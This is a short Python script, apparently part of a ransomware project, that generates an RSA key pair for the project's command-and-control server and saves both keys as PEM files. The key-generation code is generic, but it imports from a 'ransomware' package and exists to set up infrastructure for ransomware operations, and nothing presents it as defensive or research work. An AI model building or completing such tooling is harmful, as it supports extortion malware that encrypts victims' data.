#!/usr/bin/env python3
"""
Generate RSA key pair for the C2 server.
Run this once before starting the C2 server.
"""
from ransomware.crypto.keys import Keys

def main():
    priv, pub = Keys.generate_rsa_keypair()
    with open("c2_private_key.pem", "wb") as f:
        f.write(priv)
    with open("c2_public_key.pem", "wb") as f:
        f.write(pub)
    print("[OK] RSA key pair generated:")
    print(f"  Private: c2_private_key.pem")
    print(f"  Public:  c2_public_key.pem")

if __name__ == "__main__":
    main()
